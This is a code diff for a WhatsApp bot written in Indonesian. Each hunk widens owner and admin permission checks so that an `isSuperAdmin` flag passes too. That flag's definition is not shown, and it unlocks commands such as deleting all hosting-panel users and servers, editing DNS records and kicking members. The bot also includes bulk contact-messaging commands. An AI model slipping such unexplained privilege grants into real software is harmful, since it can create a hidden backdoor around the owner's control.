 				if (!text) return newReply(`⚠️ *Teksnya mana, kak?* 📛`);
 				let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
@@ -5760,7 +5761,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'pushcontact2': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`⚙️ *Penggunaan yang benar:*\n${prefix + command} idgc|teks`);
 				try {
 					const metadata = await sock.groupMetadata(text.split("|")[0]);
@@ -5780,7 +5781,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'pushcontact3': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!m.isGroup) return newReply(mess.group);
 				if (!text) return newReply(`⚙️ *Penggunaan yang benar:*\n\n${prefix + command} jeda|teks\n\n📸 *Reply gambar* untuk mengirim ke semua anggota.\n⏱️ *Jeda*: 1000 = 1 detik`);
 				try {
@@ -5812,7 +5813,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'getcontact': case 'getcon': {
 				if (!m.isGroup) return newReply(mess.group); // Hanya berlaku untuk grup
-				if (!(m.isAdmin || isCreator)) return newReply(mess.owner); // Hanya admin atau pemilik yang bisa
+				if (!(m.isAdmin || isCreator || isSuperAdmin)) return newReply(mess.owner); // Hanya admin atau pemilik yang bisa
 				bigpp = await sock.sendMessage(m.chat, {
 					text: `\nGrup: *${groupMetadata.subject}*\nAnggota: *${participants.length}*`
 				}, {quoted: m, ephemeralExpiration: 86400});
@@ -5823,7 +5824,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'savecontact': case 'svcontact': {
 				if (!m.isGroup) return newReply(mess.group); // Hanya untuk grup
-				if (!(m.isAdmin || isCreator)) return newReply(mess.owner); // Hanya admin atau pemilik yang bisa
+				if (!(m.isAdmin || isCreator || isSuperAdmin)) return newReply(mess.owner); // Hanya admin atau pemilik yang bisa
 				let cmiggc = await sock.groupMetadata(m.chat);
 				let orgiggc = participants.map(a => a.id);
 				vcard = '';
@@ -5857,7 +5858,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'contacttag': case 'contag': {
 				if (!m.isGroup) return newReply(mess.group); // Hanya untuk grup
-				if (!(m.isAdmin || isCreator)) return newReply(mess.owner); // Hanya admin atau pemilik yang bisa
+				if (!(m.isAdmin || isCreator || isSuperAdmin)) return newReply(mess.owner); // Hanya admin atau pemilik yang bisa
 				if (!m.mentionedJid[0]) return newReply('\nGunakan seperti ini\n*Kirim perintah*: .contacttag @tag|name'); // Pastikan ada yang ditandai
 				let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'; // Nama kontak
 				let sngContact = {
@@ -5888,7 +5889,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'block': 
 			case 'ban': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.m.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 				await sock.updateBlockStatus(users, 'block')
 				await newReply(mess.done);
@@ -5897,7 +5898,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'unblock': 
 			case 'unban': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.m.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 				await sock.updateBlockStatus(users, 'unblock')
 				await newReply(mess.done);
@@ -5905,7 +5906,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'getcase': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply('Harap masukkan nama case yang ingin dicari! 🧐');
 				try {
 					const getCase = (cases) => {
@@ -6106,7 +6107,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			case 'buang':
 			case 'kick': {
 				if (!m.isGroup) return newReply('Eits, perintah ini cuma bisa dipakai di grup lho, kak! 🤭');
-				if (!isCreator && !isAdmins) return newReply('Maaf ya kak, cuma admin atau owner yang bisa pakai perintah ini. 🙏');
+				if (!isCreator && !isAdmins && !isSuperAdmin) return newReply('Maaf ya kak, cuma admin atau owner yang bisa pakai perintah ini. 🙏');
 				if (!isBotAdmins) return newReply('Aku belum jadi admin nih, kak. Jadikan aku admin dulu ya biar bisa bantu! 😢');
 				if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) {
 					return newReply('Hmm... Kamu mau kick siapa nih? Sebutin dong orangnya! 🤔');
@@ -6224,7 +6225,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			case 'promote':
 			case 'pm': {
 				if (!m.isGroup) return newReply(mess.group)
-				if (!isCreator && !isAdmins) return newReply(mess.admin)
+				if (!isCreator && !isAdmins && !isSuperAdmin) return newReply(mess.admin)
 				if (!isBotAdmins) return newReply(mess.botAdmin)
 				if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return newReply('Hmm... Kamu mau promote siapa?');
 				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
@@ -6236,7 +6237,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			case 'demote':
 			case 'dm': {
 				if (!m.isGroup) return newReply(mess.group)
-				if (!isCreator && !isAdmins) return newReply(mess.admin)
+				if (!isCreator && !isAdmins && !isSuperAdmin) return newReply(mess.admin)
 				if (!isBotAdmins) return newReply(mess.botAdmin)
 				if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return newReply('Hmm... Kamu Kamu demote siapa? 🤔')
 				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
@@ -6247,7 +6248,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'revoke':{
 				if (!m.isGroup) return newReply(mess.group);
-				if (!isAdmins && !isCreator) return newReply(mess.admin);
+				if (!isAdmins && !isCreator && !isSuperAdmin) return newReply(mess.admin);
 				if (!isBotAdmins) return newReply(mess.botAdmin);
 				await sock.groupRevokeInvite(m.chat)
 					.then(res => {
@@ -6331,14 +6332,14 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'deleteppbot': 
 			case 'delppbot': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				await sock.removeProfilePicture(sock.user.id)
 				newReply(mess.done)
 			}
 			break;
 
 			case 'setbiobot':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`Where is the text?\nExample: ${prefix + command} aku AI`)
 				await sock.updateProfileStatus(text)
 				newReply(mess.done)
@@ -6371,7 +6372,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			// New Feature (Beta Feature)
 			case 'setcallprivacy':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`Penggunaan:\nsetcallprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
 				const callValue = text.toLowerCase();
 				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(callValue)) {
@@ -6388,7 +6389,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'setlastprivacy':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`Penggunaan:\nsetlastprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
 				const lastValue = text.toLowerCase();
 				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(lastValue)) {
@@ -6405,7 +6406,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'setonlineprivacy':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`Penggunaan:\nsetonlineprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
 				const onlineValue = text.toLowerCase();
 				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(onlineValue)) {
@@ -6422,7 +6423,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'setprofileprivacy':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`Penggunaan:\nsetprofileprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
 				const profileValue = text.toLowerCase();
 				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(profileValue)) {
@@ -6439,7 +6440,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'setstatusprivacy':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`Penggunaan:\nsetstatusprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
 				const statusValue = text.toLowerCase();
 				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(statusValue)) {
@@ -6456,7 +6457,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'setreadreceiptsprivacy':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`Penggunaan:\nsetreadreceiptsprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
 				const readReceiptsValue = text.toLowerCase();
 				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(readReceiptsValue)) {
@@ -6473,7 +6474,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'setreactionmode':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply('Penggunaan: setreactionmode <mode>\n\nContoh:\nsetreactionmode enabled\ntsetreactionmode disabled');	
 				const reactionMode = text.toLowerCase();
 				if (!['enabled', 'disabled'].includes(reactionMode)) {
@@ -6490,7 +6491,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'setnewsletterdesc':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!args.join(' ')) return newReply('Penggunaan: setnewsletterdesc <deskripsi>\n\nContoh:\nsetnewsletterdesc Ini deskripsi baru.');	
 				const description = args.join(' ');
 				try {
@@ -6504,7 +6505,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'setnewslettername':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!args.join(' ')) return newReply('Penggunaan: setnewslettername <nama>\n\nContoh:\nsetnewslettername Nama Baru Newsletter.');	
 				const name = args.join(' ');
 				try {
@@ -6518,7 +6519,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'setnewsletterpic':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!m.quoted || !m.quoted.isMedia) return newReply('Balas sebuah gambar untuk dijadikan foto profil newsletter.');	
 				try {
 					const media = await m.quoted.download();
@@ -6532,7 +6533,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'removenewsletterpic':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				try {
 					await sock.newsletterRemovePicture(saluran);
 					newReply('Berhasil menghapus foto profil newsletter.');
@@ -6544,7 +6545,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'follownewsletter':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`Kirim perintah ${prefix + command} <link>`);
 				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return newReply(mess.error);
 				try {
@@ -6560,7 +6561,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'unfollownewsletter':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`Kirim perintah ${prefix + command} <link>`);
 				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return newReply(mess.error);
 				try {
@@ -6576,7 +6577,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'mutenewsletter':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`Kirim perintah ${prefix + command} <link>`);
 				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return newReply(mess.error);
 				try {
@@ -6592,7 +6593,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'unmutenewsletter':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`Kirim perintah ${prefix + command} <link>`);
 				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return newReply(mess.error);
 				try {
@@ -6608,7 +6609,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 	
 			case 'createnewsletter':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!args[0] || !args[1]) return newReply('Penggunaan: createnewsletter <nama> | <deskripsi>\n\nContoh:\ncreatenewsletter Newsletter Baru | Ini deskripsi newsletter.');
 				const [newsletterName, newsletterDesc] = args.join(' ').split('|').map((v) => v.trim());
 				if (!newsletterName || !newsletterDesc) {
@@ -6669,7 +6670,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			// End New Feature (Beta Feature)
 
 			case 'listpc': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id);
 				let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`;
 				for (let i of anu) {
@@ -6684,7 +6685,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'listgc': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id);
 				let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`;
 				for (let i of anu) {
@@ -6709,7 +6710,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'creategroup':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply('Penggunaan: creategroup <nama grup> | <nomor anggota dipisahkan koma>\n*Kirim perintah*: creategroup Grup Baru | 6281234567890,6289876543210');
 				const [groupName, members] = text.split('|').map(v => v.trim());
 				if (!groupName || !members) return newReply('Format salah!');
@@ -6870,7 +6871,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'speedtest': case 'speed': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let cp = require('child_process');
 				let { promisify } = require('util');
 				let exec = promisify(cp.exec).bind(cp);
@@ -7941,7 +7942,7 @@ break;
 			case 'h':
 			case 'hidetag': {
 				if (!m.isGroup) return newReply(mess.group);
-				if (!isAdmins && !isCreator) return newReply(mess.admin);
+				if (!isAdmins && !isCreator && !isSuperAdmin) return newReply(mess.admin);
 				logCommand('hidetag', m.sender, '', 'SUCCESS');
 				if (m.quoted) {
 					sock.sendMessage(m.chat, {
@@ -7977,7 +7978,7 @@ break;
 
 			case 'autoswview':
 			case 'autostatusview':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
 				if (args[0] === 'true') {
 					autoswview = true
@@ -7990,7 +7991,7 @@ break;
 			break;
 
 			case 'anticall': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
 				if (args[0] === 'true') {
 					anticall = true
@@ -10558,7 +10559,7 @@ break;
 			case 'getjoinrequest':{
 				if (!m.isGroup) return newReply(mess.group);
 				if (!isBotAdmins) return newReply(mess.botAdmin);
-				if (!isAdmins && !isCreator) return newReply(mess.admin);
+				if (!isAdmins && !isCreator && !isSuperAdmin) return newReply(mess.admin);
 				const data = await sock.groupRequestParticipantsList(m.chat);
 				if (!data || !data.length) {
 					sock.sendMessage(m.chat, {text: '✨ Tidak ada permintaan bergabung yang tertunda. ✅'}, {quoted:m});
@@ -12038,7 +12039,7 @@ ${allMenu(prefix)}`;
 
 			case 'ownermenu':
 			case 'ownmenu':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let timestampe = speed();
 				let latensie = speed() - timestampe;
 				let a = db.data.users[m.sender];
@@ -12954,7 +12955,7 @@ ${otherMenu(prefix)}`;
 
 			case 'cekuser': 
 			case 'infouser': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!db.data.users[m.sender]) return newReply('⚠️ Data pengguna tidak ditemukan di database!');
 				let replyText = '';
 				if (!args[0]) {
@@ -13111,7 +13112,7 @@ ${otherMenu(prefix)}`;
 			break;
 
 			case 'adduseradmin': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let inputParams = q.split(',');
 				if (inputParams.length < 3) {
 					return newReply(`*Format salah!*\n\n*Penggunaan:*\n${prefix + command} email,username,name,number/tag`);
@@ -13174,7 +13175,7 @@ ${otherMenu(prefix)}`;
 			break;
 
 			case 'listuser': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let page = args[0] || '1';
 
 				try {
@@ -13220,7 +13221,7 @@ ${otherMenu(prefix)}`;
 			break;
 
 			case 'listserver': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let page = args[0] || '1';
 
 				try {
@@ -13270,7 +13271,7 @@ ${otherMenu(prefix)}`;
 			break;
 
 			case 'adduser': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let input = text.split(",");
 				let email = input[0]?.trim().toLowerCase();
 				let username = input[1]?.trim();
@@ -13310,7 +13311,7 @@ ${otherMenu(prefix)}`;
 			break;
 
 			case 'addserver': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let input = text.split(",");
 				let name = input[0]?.trim();
 				let userid = input[1]?.trim();
@@ -13353,7 +13354,7 @@ ${otherMenu(prefix)}`;
 			break;
 
 			case 'delserver': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let srv = args[0];
 				if (!srv) return newReply('⚠️ Silakan berikan *ID Server* yang ingin dihapus.');
 
@@ -13370,7 +13371,7 @@ ${otherMenu(prefix)}`;
 			break;
 
 			case 'delallserver': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 
 				await newReply(mess.wait);
 				try {
@@ -13402,7 +13403,7 @@ ${otherMenu(prefix)}`;
 			break;
 
 			case 'deluser': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let usr = args[0];
 				if (!usr) return newReply('⚠️ Silakan berikan *ID Pengguna* yang ingin dihapus.');
 
@@ -13419,7 +13420,7 @@ ${otherMenu(prefix)}`;
 			break;
 
 			case 'delalluser': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 
 				await newReply(mess.wait);
 				try {
@@ -13453,7 +13454,7 @@ ${otherMenu(prefix)}`;
 			case 'startserver':
 			case 'stopserver':
 			case 'restartserver': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let action = command.replace('server', '');
 				let srv = args[0];
 
@@ -13470,7 +13471,7 @@ ${otherMenu(prefix)}`;
 			break;
 
 			case '1gb': case '2gb': case '3gb': case '4gb': case '5gb': case '6gb': case '7gb': case '8gb': case '9gb': case '10gb': case '11gb': case '12gb': case '13gb': case '14gb': case '15gb': case '16gb': case '17gb': case '18gb': case '19gb': case '20gb': case '21gb': case '22gb': case '23gb': case '24gb': case '25gb': case '26gb': case '27gb': case '28gb': case '29gb': case '30gb': case '31gb': case '32gb': case '33gb': case '34gb': case '35gb': case '36gb': case '37gb': case '38gb': case '39gb': case '40gb': case '41gb': case '42gb': case '43gb': case '44gb': case '45gb': case '46gb': case '47gb': case '48gb': case '49gb': case '50gb': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) {
 					return newReply(
 						`⚠️ Mohon masukkan *nama pengguna atau nomor* yang valid.\n\n` +
@@ -13559,7 +13560,7 @@ ${otherMenu(prefix)}`;
 			}
 
 			case 'unli': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) {
 					return newReply(
 						`⚠️ Mohon masukkan *nama pengguna atau nomor* yang valid.\n\n` +
@@ -13648,7 +13649,7 @@ ${otherMenu(prefix)}`;
 			}
 
 			case 'listsubdo': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 
 				try {
 					let records = await getDnsRecords();
@@ -13673,7 +13674,7 @@ ${otherMenu(prefix)}`;
 			break;
 
 			case 'addsubdo': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 	
 				let [type, name, content] = args;
 				if (!type || !name || !content) return newReply(`⚠️ Gunakan format: ${prefix + command} <Tipe> <Nama> <Target>\n\n*Contoh:* ${prefix + command} A www 192.168.1.1`);
@@ -13689,7 +13690,7 @@ ${otherMenu(prefix)}`;
 			break;
 
 			case 'delsubdo': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 	
 				let recordId = args[0];
 				if (!recordId) return newReply(`⚠️ Silakan berikan *ID* subdo yang ingin dihapus.\n\nGunakan ${prefix + command} untuk melihat ID subdomain.`);
